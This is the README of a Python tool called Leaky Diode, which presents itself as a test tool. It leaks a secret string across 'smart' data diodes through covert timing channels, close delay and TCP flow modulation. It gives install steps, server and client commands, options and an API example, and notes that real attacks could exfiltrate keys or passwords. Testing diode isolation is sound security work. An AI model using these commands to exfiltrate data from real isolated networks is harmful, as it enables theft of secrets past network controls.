# Leaky Diodes

Leaky diode is a data exfiltration test tool for *smart* data diodes, that is 
data diodes with support for TCP pass-through with the help of some side channel
from the isolated side. The attacks used are **flow modulation** and/or 
**close delay**:

- **CLOSE DELAY** uses the delay between the request of one the secret's bits and
the time the server closes the connection to encode the bit value. (i.e.- 10 seconds
delay means a 0, 30 seconds delay a 1)

- **FLOW MODULATION** uses tcp flow control mechanism to encode secret's bits as
a transfer speed. For example if the the bit requested by the client is 1 the server
throttles the speed to 300KB/s, if it's 0 to 100KB/s. The advantage of this attack is
that using a single connection makes it harder to detect.


## Installation

Download the package or clone the repository, and then install with:

```bash
python3 setup.py install
```

or use pypi:

```bash
pip install leaky_diode
```

## Usage

On the isolated side launch the server:

```bash
leaky_server public_ip port 'secret string that needs leaking'
```

On the untrusted side launch the client and select one of the attacks,

```bash
leaky_client server_ip server_port --mode flow --partial
```

or

```bash
leaky_client server_ip server_port --mode close --partial
```

And just wait a few minutes to receive the first byte (it's the slowest), if you're not sure
if it's working add --verbose option so it prints messages on each received bit.
 

## Options

```bash
usage: leaky_client [-h] [--mode mode] [--low_delay delay] [--high_delay delay] [--low_rate rate] 
					[--high_rate rate] [--sample_time time] [--settle_time time] [--partial]
                    host port

Leaky Diode is a data exfiltration test tool for data diodes

positional arguments:
  host                  Remore host address
  port                  Remote host port

optional arguments:
  -h, --help            Show this help message and exit
  --mode mode, -m mode  Attack mode 'flow' or 'close' (default: flow)
  --low_delay delay     Close delay for low bits (default: 5s) (only Close Mode)
  --high_delay delay    Close delay for high bits (default: 10s) (only Close Mode)
  --low_rate rate       Tx rate for low bits (default: 64 KB/s) (only Flow Mode)
  --high_rate rate      Tx rate for high bits (default: 300 KB/s) (only Flow Mode)
  --sample_time time    Tx rate sampling interval (default: 3.0s) (only Flow Mode)
  --settle_time time    Settle time between sending a bit request and the start of 
                        sampling (default: 8.0s) (only Flow Mode)
  --partial             Show partial results each time another byte from the secret is received
  --verbose             Show debugging messages
```

```bash
usage: leaky_server [-h] host port secret_string

Leaky Diode is a data exfiltration test tool for data diodes

positional arguments:
  host           Remore host address
  port           Remote host port
  secret_string  Attack mode 'flow' or 'close' (default: a secret string)

optional arguments:
  -h, --help     Show this help message and exit
  -v, --verbose  Show debugging messages
```

## Performance

The attack throughput with the default parameters is around 1 B/min (yes, one byte per minute),
you can increase it by lowering the delay times in **close delay** mode, and the settle/sample
times in **flow modulation** (the default values are very conservative)

An actual exfiltration attempt using this attack could easily leak a few KB per day, too slow
for large breachs, but enough for targeted attacks for keys/passwords or selected users data.


## API

It is also possible to use leaky_diode as a package and include a server in your own app:


* class LeakyServer(host, port, secret, ticks=100, max_connections=10)

	* host: (str) Listen interface ip addres ('' for all)
	* port: (int) Listen port
	* secret: (bytes) Secret to leak (max length 65535)
	* ticks: (int) Ticks per second the worker process use to throttle the connections.
	* max_connections: (int) Max concurrent connection the server can handle.

	* **start()**: Initialize and launch server worker processes
    * **stop()**: Stop server and its workers

   
```python
from leaky_diode import LeakyServer

leaky_server = LeakyServer('192.168.0.10', 9000, b'some secret byte string')
leaky_server.start()

# Do something else
......

# Close server before exit
leaky_server.close()
``` 


## TODO

- Harden message parsing input validation (invalid lengths)
- Use concurrent connection to increase exfiltration speed.
- Tune flow modulation mode tx speeds .
- Tune close delay mode delays.
- Add CRC to the secret and secret length, or even better error correction. 
- Add resume capability so there is no need to get the secret in one go.
- Add some tests.


## References

- Data Diodes [Wikipedia](https://en.wikipedia.org/wiki/Unidirectional_network)
- Place holder so I remember to publish a post on the attacks
- And another on transport and streaming protocols for data diodes
